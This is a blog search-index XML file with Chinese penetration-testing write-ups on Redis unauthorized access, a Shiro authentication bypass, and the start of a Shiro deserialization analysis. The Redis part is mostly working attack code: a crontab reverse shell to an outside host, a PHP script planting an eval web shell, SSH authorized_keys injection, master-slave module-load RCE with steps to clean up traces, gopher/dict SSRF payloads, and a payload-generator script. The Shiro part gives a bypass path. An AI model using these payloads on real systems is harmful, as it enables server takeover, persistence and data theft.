<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Redis未授权访问</title>
    <url>/2020/08/30/redis_unauthorized_access/</url>
    <content><![CDATA[<h2 id="redis未授权访问"><a href="#redis未授权访问" class="headerlink" title="redis未授权访问"></a>redis未授权访问</h2><h3 id="0X00-redis的未授权访问简介"><a href="#0X00-redis的未授权访问简介" class="headerlink" title="0X00 redis的未授权访问简介"></a>0X00 redis的未授权访问简介</h3><ul>
<li>Redis在默认情况下，绑定地址为127.0.0.1:6379，在不适当操作下，会绑定地址为0.0.0.0:6379，且无采用限制IP访问，将会把Redis服务直接暴露在公网上，再加上若无设置密码认证，会导致任意用户未授权访问Redis以及读取Redis数据并写公钥进行远程连接等，甚至getshell</li>
</ul>
<h3 id="0X01-crontab-getshell"><a href="#0X01-crontab-getshell" class="headerlink" title="0X01 crontab-getshell"></a>0X01 crontab-getshell</h3><ul>
<li>在Linux系统中有定时任务的功能，只要文件可以写入到定时任务目录里面就可以执行系统命令</li>
<li>任务目录<ul>
<li>/var/spool/cron/用户名</li>
<li>/var/spool/cron/crontabs/用户名</li>
<li>/etc/crontab</li>
<li>/etc/cron.d/xxx</li>
</ul>
</li>
<li>reids-cli客户端写crontab</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set x &quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/1.1.1.1/888 0&gt;&amp;1\n&quot;  //反弹端口888的shell</span><br><span class="line">config set dir /var/spool/cron/  //设置保存的路径</span><br><span class="line">config set dbfilename root  //设置数据库文件名</span><br><span class="line">save  //数据库保存，促发反弹</span><br></pre></td></tr></table></figure>

<ul>
<li>写crontab的代码</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $redis = new Redis();</span><br><span class="line">    $redis-&gt;connect(&apos;192.168.0.110&apos;,6380);</span><br><span class="line">    $redis-&gt;flushall();</span><br><span class="line">    $redis-&gt;set(&quot;xxx&quot;,&quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/1.1.1.1/888 0&gt;&amp;1\n&quot;);</span><br><span class="line">    $redis-&gt;config(&quot;SET&quot;,&quot;dir&quot;,&quot;/var/spool/cron/&quot;);</span><br><span class="line">    $redis-&gt;config(&quot;SET&quot;,&quot;dbfilename&quot;,&quot;root&quot;);</span><br><span class="line">    $redis-&gt;save();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>▲ Ubuntu下的crontab对写入的数据有要求，不能出现乱码，但redis写入的时候，会将配置以及缓存数据一起写入，所以无法执行任务，执行任务会出错</li>
<li>▲ Ubuntu下的crontab执行任务使用的是/bin/dash，无法触发执行定时任务，需要修改为/bin/bash才能触发执行任务</li>
</ul>
<h3 id="0X02-web-getshell"><a href="#0X02-web-getshell" class="headerlink" title="0X02 web-getshell"></a>0X02 web-getshell</h3><ul>
<li>前提<ul>
<li>web的绝对路径</li>
<li>redis有足够的权限</li>
</ul>
</li>
<li>写shell的代码</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $redis = new Redis();</span><br><span class="line">    $redis-&gt;connect(&apos;192.168.0.110&apos;,6380);</span><br><span class="line">    $redis-&gt;flushall();</span><br><span class="line">    $redis-&gt;set(&quot;xxx&quot;,&quot;\n&lt;?php eval(\$_GET[&apos;cmd&apos;]);?&gt;\n&quot;);</span><br><span class="line">    $redis-&gt;config(&quot;SET&quot;,&quot;dir&quot;,&quot;/var/www/html/&quot;);</span><br><span class="line">    $redis-&gt;config(&quot;SET&quot;,&quot;dbfilename&quot;,&quot;root.php&quot;);</span><br><span class="line">    $redis-&gt;save();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/middleware/redis/web_getshell.png" alt="web-getshell"></p>
<h3 id="0X03-ssh-getshell"><a href="#0X03-ssh-getshell" class="headerlink" title="0X03 ssh-getshell"></a>0X03 ssh-getshell</h3><ul>
<li>通过写.ssh文件下的authorized_key进行getshell</li>
<li>写入成功后通过终端设备进行连接</li>
<li>写authorized_key的代码</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $str = &quot;ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAg8kuNZfIZbHB5Ek5ZPo8SERdxKV7NpLPIpOyAGUXYAZW5k1I4S0+G9wGkcIrJ2kS/cc681NrDjxGlLXXQ/4uWclTGOcLud477Q0pyG1C9AHLQpprcrujbb0mEAuqUfw4F1Nhltz3WdxgdFuJT/dgQ8SJskudh3coUSh5ipjwKEUWmAXTkMfWxU/VJ2DD1n5imOvBqEVEoquy8GXtylLt70ijp481gkSEDoQP3TqTKKbZWEN63d4p7xff+1ZgQHuuWzbmw8G6bWrWWdO7k2k4117lWJi2lJYm4//eauP85iEoqRCm4UBWcnZ6dmGHt4U1oTeGOeyqAQxoJ2/0sdmLjQ== rsa-key-20200612&quot;;</span><br><span class="line">    $redis = new Redis();</span><br><span class="line">    $redis-&gt;connect(&apos;122.51.135.129&apos;,6379);</span><br><span class="line">    $redis-&gt;select(1);</span><br><span class="line">    $redis-&gt;flushall();</span><br><span class="line">    $redis-&gt;set(&quot;xxx&quot;,&quot;\n\n&quot;.$str.&quot;\n\n&quot;);</span><br><span class="line">    $redis-&gt;config(&quot;SET&quot;,&quot;dir&quot;,&quot;/root/.ssh&quot;);</span><br><span class="line">    $redis-&gt;config(&quot;SET&quot;,&quot;dbfilename&quot;,&quot;authorized_keys&quot;);</span><br><span class="line">    $redis-&gt;save();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/middleware/redis/authorized_key_getshell.png" alt="authorized_key_getshell"></p>
<h3 id="0X04-主从复制getshell"><a href="#0X04-主从复制getshell" class="headerlink" title="0X04 主从复制getshell"></a>0X04 主从复制getshell</h3><ul>
<li>利用条件<ul>
<li>低权的时候，redis以root权限运行，通过RCE获得root权限</li>
<li>未授权直接利用</li>
</ul>
</li>
<li>主从模式测试</li>
</ul>
<p><img src="/images/middleware/redis/slaveof-test.png" alt="slaveof-test"></p>
<ul>
<li>漏洞利用：漏洞存在于4.x、5.x版本中，Redis提供了主从模式，主从模式指使用一个redis作为主机，其他的作为备份机，主机从机数据都是一样的，从机只负责读，主机只负责写。在Reids 4.x之后，通过外部拓展，可以实现在redis中实现一个新的Redis命令，构造恶意.so文件。在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上。然后在从机上加载恶意so文件，即可执行命令</li>
</ul>
<h5 id="漏洞利用工具"><a href="#漏洞利用工具" class="headerlink" title="漏洞利用工具"></a>漏洞利用工具</h5><ul>
<li>生成module.so文件 <a href="https://github.com/n0b0dyCN/RedisModules-ExecuteCommand" target="_blank" rel="noopener">https://github.com/n0b0dyCN/RedisModules-ExecuteCommand</a></li>
<li>rce-1 <a href="https://github.com/Ridter/redis-rce.git" target="_blank" rel="noopener">https://github.com/Ridter/redis-rce.git</a></li>
<li>rce-2 <a href="https://github.com/LoRexxar/redis-rogue-server" target="_blank" rel="noopener">https://github.com/LoRexxar/redis-rogue-server</a></li>
<li>利用过程<ul>
<li>下载module.so文件，进行make编译，生成一个module.so</li>
<li>将module复制到redis-rce的目录中，通过终端执行命令<code>python redis-rce.py -r 目标ip -p 目标端口 -L 本地ip -f module.so</code>，进而获取shell</li>
</ul>
</li>
</ul>
<h5 id="redis-rce的大致原理"><a href="#redis-rce的大致原理" class="headerlink" title="redis-rce的大致原理"></a>redis-rce的大致原理</h5><ul>
<li>采用python伪装成redis数据库，然后受害者将我们的数据库设置为主节点</li>
<li>将备份的rdb数据库备份文件内容替换为恶意的so文件</li>
<li>设置传输方式为全量传输，就会自动在节点redis中生成exp.so</li>
<li>用module load命令加载so文件即可完成rce</li>
<li>▲ 重点是支持全量传输</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.读取exp.so</span><br><span class="line">2.调用runserver函数处理runserver(options.rhost, options.rport, options.lhost, options.lport) #目标IP、目标端口、attack IP、attack监听的端口（默认监听21000端口）</span><br><span class="line">3.调用Remote.do() #发送Redis密码验证，并返回结果，如果返回invalid password代表密码错误</span><br><span class="line">4.密码正确，redis登录成功后，发送info指令查看redis数据库详细信息</span><br><span class="line">5.发送SLAVEOF指令，指令格式 SLAVEOF host port #作用通过执行 SLAVEOF host port 命令，可以将当前服务器转变为指定服务器的从属服务器(slave server)，这里的host和port则指向attack的IP和端口</span><br><span class="line">6.发送CONFIG SET dbfilename &lt;name&gt; 设置文件名称(根据exp.so的文件名来设置的文件名，比如exp.so。设置的dbfilename就是exp)</span><br><span class="line">7.监听本机21000端口，等待redis回传的数据。根据返回的结果将exp转换成bytes，发送exp</span><br><span class="line">8.MODULE LOAD指令加载exp.so</span><br><span class="line">9.取消从属服务器</span><br><span class="line">10.根据选择是进入shell或者执行其他指令</span><br><span class="line">12.若是执行shell指令，则调用exp.so里面的system.exec函数后面跟上命令。system.exec &lt;command&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/middleware/redis/slaveof-getshell.png" alt="slaveof-getshell"></p>
<h5 id="本地手工执行命令设置备份"><a href="#本地手工执行命令设置备份" class="headerlink" title="本地手工执行命令设置备份"></a>本地手工执行命令设置备份</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.config set dir ./</span><br><span class="line">2.config set dbfilename exp.so</span><br><span class="line">3.slaveof X.X.X.195</span><br><span class="line">4.slaveof X.X.X.195 21000  #上面看绑定的服务段端口是21000</span><br><span class="line">5. module load ./exp.so</span><br><span class="line">6.slaveof no one</span><br><span class="line">7.system.exec &apos;whoami&apos;</span><br><span class="line"></span><br><span class="line">清理痕迹</span><br><span class="line">8.config set dbfilename dump.rdb</span><br><span class="line">9.system.exec &apos;rm ./exp.so&apos;</span><br><span class="line">10.module unload system</span><br></pre></td></tr></table></figure>

<h5 id="禁用config命令绕过"><a href="#禁用config命令绕过" class="headerlink" title="禁用config命令绕过"></a>禁用config命令绕过</h5><ul>
<li>如果在redis.conf配置了禁用config命令的时候 </li>
<li>绕过方法</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rename-command CONFIG &quot;&quot;</span><br></pre></td></tr></table></figure>

<ul>
<li>限制<ul>
<li>虽然此时没有办法自定义文件后缀，但是还是可以利用主从复制</li>
<li>后续只需要把dump.rdp当成exp.so去正常加载即可</li>
</ul>
</li>
</ul>
<h3 id="0X04-协议读取redis"><a href="#0X04-协议读取redis" class="headerlink" title="0X04 协议读取redis"></a>0X04 协议读取redis</h3><ul>
<li>▲ redis官方使用的RESP协议</li>
<li>客户端与redis服务端的交互流程<ul>
<li>客户端向Redis服务器发送一个仅由Bulk Strings组成的RESP Arrays</li>
<li>Redis服务器回复发送任何有效RESP数据类型作为回复的客户端</li>
</ul>
</li>
<li>Bulk Strings用于表示长度最大为512 MB的单个二进制安全字符串，按以下方式编码：<ul>
<li>一个$字节后跟组成字符串的字节数（一个前缀长度），由CRLF终止。</li>
<li>实际的字符串数据</li>
<li>最终的CRLF</li>
<li>如字符串foobar编码后为$6\r\nfoobar\r\n</li>
</ul>
</li>
<li>RESP Arrays使用以下格式发送<ul>
<li>一个*字符作为第一个字节，后跟数组中的元素数作为十进制数，后跟CRLF</li>
<li>数组中的每个元素都附加RESP类型</li>
</ul>
</li>
<li>数据包的理解<ul>
<li>每一个*number代表每一行命令，number代表每行命令中数组中的元素个数。$number代表每个元素的长度</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">*1</span><br><span class="line">$8</span><br><span class="line">flushall</span><br><span class="line">*3</span><br><span class="line">$3</span><br><span class="line">set</span><br><span class="line">$1</span><br><span class="line">1</span><br><span class="line">$22</span><br><span class="line">&lt;?php phpinfo();?&gt;</span><br><span class="line"></span><br><span class="line">//代表的命令行</span><br><span class="line">flushall</span><br><span class="line">set 1 &lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>

<h5 id="gopher协议"><a href="#gopher协议" class="headerlink" title="gopher协议"></a>gopher协议</h5><ul>
<li>gopher支持多行，也即可以进行攻击需要认证的redis</li>
<li>格式：gopher://ip:port/_<ul>
<li>要在传输数据前加一个无用的字符，gopher协议会将第一个字符”吃掉”</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//非标准的请求</span><br><span class="line">curl &quot;gopher://127.0.0.1:6379/_auth%20root%0d%0aset%20a%20test&quot;</span><br><span class="line"></span><br><span class="line">//标准的请求（RESP格式）</span><br><span class="line">curl &quot;gopher://127.0.0.1:6379/_*3%0d%0A%243%0d%0Aset%0d%0A%241%0d%0A1%0d%0A%243%0d%0A123&quot;</span><br></pre></td></tr></table></figure>

<h5 id="dict协议"><a href="#dict协议" class="headerlink" title="dict协议"></a>dict协议</h5><ul>
<li>dict格式不支持多行，也即无法攻击需要认证的redis</li>
<li>格式：dict://serverip:port/name:data<ul>
<li>向服务器的端口请求name data，并在末尾 自动补上rn(CRLF)结果测试其实还会发送一个QUIT</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl &quot;dict://127.0.0.1:6379/set:1:123&quot;</span><br></pre></td></tr></table></figure>

<ul>
<li>在实验中发现，支持单行的command执行发送，不需要client端发送CLINET的命令，虽然存在报错，但是还是成功执行</li>
</ul>
<p><img src="/images/middleware/redis/dict-client.png" alt="dict-client"></p>
<h3 id="通用利用脚本"><a href="#通用利用脚本" class="headerlink" title="通用利用脚本"></a>通用利用脚本</h3><ul>
<li>脚本来自xq17师傅</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line"># -*-coding:utf-8-*-</span><br><span class="line"># author:xq17</span><br><span class="line"></span><br><span class="line">import urllib.parse</span><br><span class="line"></span><br><span class="line">def tranToResp(x):</span><br><span class="line">        xSplit = x.split(&quot; &quot;)</span><br><span class="line">        cmd=&quot;&quot;</span><br><span class="line">        cmd+=&quot;*&quot;+str(len(xSplit))</span><br><span class="line">        for i in xSplit:</span><br><span class="line">            i = i.replace(&quot;$&#123;IFS&#125;&quot;,&quot; &quot;)</span><br><span class="line">            cmd+=&quot;\r\n&quot;+&quot;$&quot;+str(len(i))+&quot;\r\n&quot;+ i</span><br><span class="line">        cmd+=&quot;\r\n&quot;</span><br><span class="line">        return cmd</span><br><span class="line"></span><br><span class="line">def GeneratePayload(ip, port):</span><br><span class="line">    cmd=[</span><br><span class="line">     &quot;config set dir ./&quot;,</span><br><span class="line">     &quot;config set dbfilename exp.so&quot;,</span><br><span class="line">     &quot;slaveof &#123;i&#125; &#123;p&#125;&quot;.format(i=ip, p=port),</span><br><span class="line">     &quot;module load exp.so&quot;,</span><br><span class="line">     &quot;system.exec ls&quot;,</span><br><span class="line">     &quot;system.exec rm$&#123;IFS&#125;exp.so&quot;,</span><br><span class="line">     &quot;quit&quot;,</span><br><span class="line">     ]</span><br><span class="line">     # &quot;system.exec bash$&#123;IFS&#125;-i$&#123;IFS&#125;&gt;&amp;$&#123;IFS&#125;/dev/tcp/192.168.8.103/4607$&#123;IFS&#125;0&gt;&amp;1&quot;,</span><br><span class="line">    payload = &quot;&quot;</span><br><span class="line">    for p in cmd:</span><br><span class="line">        payload += urllib.parse.quote(tranToResp(p))</span><br><span class="line">    return payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    # target</span><br><span class="line">    ip = &quot;127.0.0.1&quot;</span><br><span class="line">    port = &quot;6383&quot;</span><br><span class="line">    # server load exp.so</span><br><span class="line">    serverIp = &quot;101.x.x.x&quot;</span><br><span class="line">    serverPort = &quot;21000&quot;</span><br><span class="line">    authPass = &quot;123123&quot;</span><br><span class="line">    payload = GeneratePayload(serverIp, serverPort)</span><br><span class="line">    exitPayload = (urllib.parse.quote(tranToResp(&quot;slaveof no one&quot;) + tranToResp(&quot;quit&quot;) ))</span><br><span class="line">    if authPass:</span><br><span class="line">        print(&quot;author attack:&quot;)</span><br><span class="line">        pd = &quot;gopher://&#123;host&#125;:&#123;port&#125;/_%2a%32%0d%0a%24%34%0d%0a%61%75%74%68%0d%0a%24&#123;l&#125;%0d%0a&#123;p&#125;%0d%0a&quot;</span><br><span class="line">        pd = pd.format(host=ip, port=port, l=str(len(authPass)), p=authPass)</span><br><span class="line">        print(pd + payload)</span><br><span class="line">        print(&quot;clean footprint:&quot;)</span><br><span class="line">        print(pd + exitPayload)</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;no author attack:&quot;)</span><br><span class="line">        pd = &quot;gopher://&#123;host&#125;:&#123;port&#125;/_&quot;</span><br><span class="line">        print(pd.format(host=ip, port=port)+payload)</span><br><span class="line">        print(&quot;clean footprint:&quot;)</span><br><span class="line">        print(pd.format(host=ip, port=port) + exitPayload)</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<h3 id="防范措施"><a href="#防范措施" class="headerlink" title="防范措施"></a>防范措施</h3><ul>
<li>设置本机才能访问</li>
<li>设置复杂性密码</li>
<li>redis-server不以root权限运行</li>
</ul>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul>
<li><a href="http://www.vkxss.top/2019/05/28/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E4%B9%8Bubuntu%E5%8F%8D%E5%BC%B9shell%E9%97%AE%E9%A2%98/index.html" target="_blank" rel="noopener">Ubuntu下redis写crontab遇到的坑</a></li>
<li><a href="https://paper.seebug.org/1169/" target="_blank" rel="noopener">细数redis的几种getshell方法</a></li>
<li><a href="https://www.freebuf.com/vuls/224235.html" target="_blank" rel="noopener">记一次Redis+Getshell经验分享</a></li>
<li><a href="https://www.cnblogs.com/kismetv/p/9236731.html" target="_blank" rel="noopener">深入学习Redis（3）：主从复制</a></li>
<li><a href="https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf" target="_blank" rel="noopener">Pavel Toporkov分享的rce方式</a></li>
<li><a href="https://422926799.github.io/posts/ac34060e.html" target="_blank" rel="noopener">redis-rce的原理</a></li>
<li><a href="https://redis.io/topics/protocol" target="_blank" rel="noopener">redis-RESP</a></li>
<li><a href="https://xz.aliyun.com/t/7974#toc-11" target="_blank" rel="noopener">浅析Linux下Redis的攻击面(一)</a></li>
</ul>
]]></content>
      <categories>
        <category>middleware</category>
      </categories>
  </entry>
  <entry>
    <title>Shiro权限绕过漏洞</title>
    <url>/2020/08/30/shiro_privilge_bypass/</url>
    <content><![CDATA[<h3 id="Shiro权限绕过漏洞（Shiro-682）"><a href="#Shiro权限绕过漏洞（Shiro-682）" class="headerlink" title="Shiro权限绕过漏洞（Shiro-682）"></a>Shiro权限绕过漏洞（Shiro-682）</h3><blockquote>
<p>CVE-2020-1597</p>
</blockquote>
<h5 id="影响版本：Apache-Shiro-lt-1-5-2"><a href="#影响版本：Apache-Shiro-lt-1-5-2" class="headerlink" title="影响版本：Apache Shiro &lt; 1.5.2"></a>影响版本：Apache Shiro &lt; 1.5.2</h5><h5 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h5><ul>
<li>由于Shiro的拦截器和Spring(Servlet)拦截器对于URI模式匹配的差异，导致鉴权问题</li>
</ul>
<h5 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h5><ul>
<li>在Spring框架下uri = uri + ‘/’可以绕过Shiro防护<ul>
<li>在Spring web项目中，请求URI/resource/menus和URI/resource/menus/都可以访问到服务器的资源</li>
<li>在Shiro中的URL路径表达式pathPattern可以正确匹配到/resource/menus，但不能正确匹配/resource/menus，导致过滤无法正确匹配，绕过了Shiro的防护机制</li>
</ul>
</li>
<li>Shiro拦截器<ul>
<li>Shiro框架通过拦截器功能来实现对用户访问权限的控制和拦截<ul>
<li>anon为匿名拦截器，不需要登陆就能访问，一般用于静态资源或者移动接口 -&gt; <code>/index.html = anon</code></li>
<li>authc为登陆拦截器，需要登陆认证才能访问到的资源  -&gt;<code>/user/** = authc</code></li>
</ul>
</li>
<li>Shiro的URL路径表达式为Ant格式，路径通配符支持<code>? * **</code><ul>
<li><code>?</code>：匹配一个字符</li>
<li><code>*</code>：匹配零个或多个字符</li>
<li><code>**</code>：匹配路径中的零个或多个字符</li>
</ul>
</li>
</ul>
</li>
</ul>
<h5 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><ul>
<li>Shiro版本</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.shiro<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>shiro-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.4.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.shiro<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>shiro-spring<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.4.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>修改ShiroConfig配置文件，添加authc拦截器的拦截正则</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">@Bean</span><br><span class="line">ShiroFilterFactoryBean shiroFilterFactoryBean() &#123;</span><br><span class="line">    ShiroFilterFactoryBean bean = new ShiroFilterFactoryBean();</span><br><span class="line">    ...</span><br><span class="line">    ...</span><br><span class="line">    //map.put("/*", "authc");</span><br><span class="line">    map.put("/hello/*", "authc"); </span><br><span class="line">    bean.setFilterChainDefinitionMap(map);</span><br><span class="line">    return bean;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>修改路由控制方法</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">@GetMapping("/hello/&#123;currentPage&#125;")</span><br><span class="line">    public String hello(@PathVariable Integer currentPage) &#123;</span><br><span class="line">        return "hello";</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>启动应用<ul>
<li>访问/hello/1接口，会被authc拦截器拦截，会跳转到登录接口进行登录</li>
<li>访问/hello/1/，成功绕过authc拦截器拦截，直接获取到资源</li>
</ul>
</li>
<li>▲ 2020-08-22 本实验因为环境问题，暂无进行试验</li>
</ul>
<h5 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h5><ul>
<li><p>PathMatchingFilterChainResolver下的getChain函数</p>
<ul>
<li>根据URL路径匹配中配置的url路径表达式来匹配输入的URL</li>
<li>判断是否匹配拦截器，匹配成功将会返回响应的拦截器执行链</li>
<li>让ShiroFither执行权限操作的</li>
</ul>
</li>
<li><p>pathMatches函数其最终会调用shiro.util.AntPathMatcher类中doMatch的对于ant格式的pathPattern和requestURI进行匹配</p>
<ul>
<li>doMatch:109, AntPathMatcher (org.apache.shiro.util)，当Shiro 的Ant格式的pathPattern 中的的<code>*</code>通配符是不支持匹配路径的，所以可以绕过拦截器，直接访问到资源</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//pathMatches:135, PathMatchingFilterChainResolver (org.apache.shiro.web.filter.mgt)</span><br><span class="line">protected boolean pathMatches(String pattern, String path) &#123;</span><br><span class="line">        PatternMatcher pathMatcher = this.getPathMatcher();</span><br><span class="line">        return pathMatcher.matches(pattern, path);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="版本修复与绕过"><a href="#版本修复与绕过" class="headerlink" title="版本修复与绕过"></a>版本修复与绕过</h5><ul>
<li>1.5.0版本修复<ul>
<li>代码修复位置为pathsMatch:125, PathMatchingFilter (org.apache.shiro.web.filter)，该修复方式是通过判断requestURI是否以<code>/</code>为结尾，如果以<code>/</code>结尾的话，则去掉尾部的<code>/</code>符号在与URL表达式进行比较</li>
<li>当requestURI为<code>/hello/1/</code>等以<code>/</code>为结尾的URI的时候，都会被清除最后的<code>/</code>号，再进行URL路径匹配</li>
</ul>
</li>
<li>&lt; 1.5.1版本绕过<ul>
<li>payload：<code>/fdsf;/../hello/1</code></li>
<li>问题同样是在getChain函数中对于requestURI的获取中，获取到的是/fdsf</li>
<li>在RequestUri函数中最终调用decodeAndCleanUriString函数对URI进行清洗</li>
<li>如果URI中存在<code>;</code>号的话，则会删除其后面的所有字符。<code>/fdsf;/../hello/1/</code>最终也就变成了<code>/fdsf</code> 从而导致了绕过</li>
</ul>
</li>
<li>1.5.2版本修复<ul>
<li>获取requestURI的方式从<code>request.getRequestUri</code>直接获取的方式更改为获取request的ContextPath，ServletPath，PathInfo，然后再重新拼接而成</li>
</ul>
</li>
</ul>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul>
<li><a href="[https://blog.riskivy.com/shiro-%e6%9d%83%e9%99%90%e7%bb%95%e8%bf%87%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90%ef%bc%88cve-2020-1957%ef%bc%89/](https://blog.riskivy.com/shiro-权限绕过漏洞分析（cve-2020-1957）/)">Shiro 权限绕过漏洞分析（CVE-2020-1957）</a></li>
<li><a href="https://blog.csdn.net/qq_43645782/article/details/106084263" target="_blank" rel="noopener">Apache Shiro 权限绕过漏洞 （Shiro-682）复现</a></li>
</ul>
]]></content>
      <categories>
        <category>middleware</category>
      </categories>
  </entry>
  <entry>
    <title>Shiro反序列化漏洞</title>
    <url>/2020/08/30/shiro_unserialize/</url>
    <content><![CDATA[<h2 id="Shiro-反序列化漏洞"><a href="#Shiro-反序列化漏洞" class="headerlink" title="Shiro 反序列化漏洞"></a>Shiro 反序列化漏洞</h2><h3 id="0X00-Shiro-rememberMe-Shiro-550"><a href="#0X00-Shiro-rememberMe-Shiro-550" class="headerlink" title="0X00 Shiro rememberMe(Shiro-550)"></a>0X00 Shiro rememberMe(Shiro-550)</h3><blockquote>
<p>CVE-2016-4437</p>
</blockquote>
<h5 id="影响版本：Apache-Shiro-lt-1-2-4"><a href="#影响版本：Apache-Shiro-lt-1-2-4" class="headerlink" title="影响版本：Apache Shiro &lt; 1.2.4"></a>影响版本：Apache Shiro &lt; 1.2.4</h5><h5 id="一键利用工具：ShiroExploit"><a href="#一键利用工具：ShiroExploit" class="headerlink" title="一键利用工具：ShiroExploit"></a>一键利用工具：<a href="https://github.com/feihong-cs/ShiroExploit" target="_blank" rel="noopener">ShiroExploit</a></h5><h5 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><ul>
<li>shiro在登录处提供了Remember Me这个功能，来记录用户登录的凭证，然后shiro使用了CookieRememberMeManager类对用户的登陆凭证，也就是Remember Me的内容进行一系列处理：</li>
</ul>
<p><strong>使用Java序列化 —&gt; 使用密钥进行AES加密 —&gt; Base64加密 —&gt; 得到加密后的Remember Me内容</strong></p>
<ul>
<li>同时在识别用户身份的时候，需要对Remember Me的字段进行解密，解密的顺序为：</li>
</ul>
<p><strong>Remember Me加密内容 —&gt; Base64解密 —&gt; 使用密钥进行AES解密 —&gt;Java反序列化</strong></p>
<ul>
<li>▲ 问题出在<strong>AES加密的密钥Key被硬编码在代码里</strong>，这意味着攻击者只要通过源代码找到AES加密的密钥，就可以构造一个恶意对象，对其进行序列化，AES加密，Base64编码，然后将其作为cookie的Remember Me字段发送，Shiro将RememberMe进行解密并且反序列化，最终造成反序列化漏洞</li>
</ul>
<h5 id="漏洞加密分析"><a href="#漏洞加密分析" class="headerlink" title="漏洞加密分析"></a>漏洞加密分析</h5><ul>
<li>登录<a href="http://localhost:8080/login.jsp" target="_blank" rel="noopener">http://localhost:8080/login.jsp</a> ，勾选rememberMe，登录成功后会看到一个key为rememberMe，value长度为512的Cookie</li>
</ul>
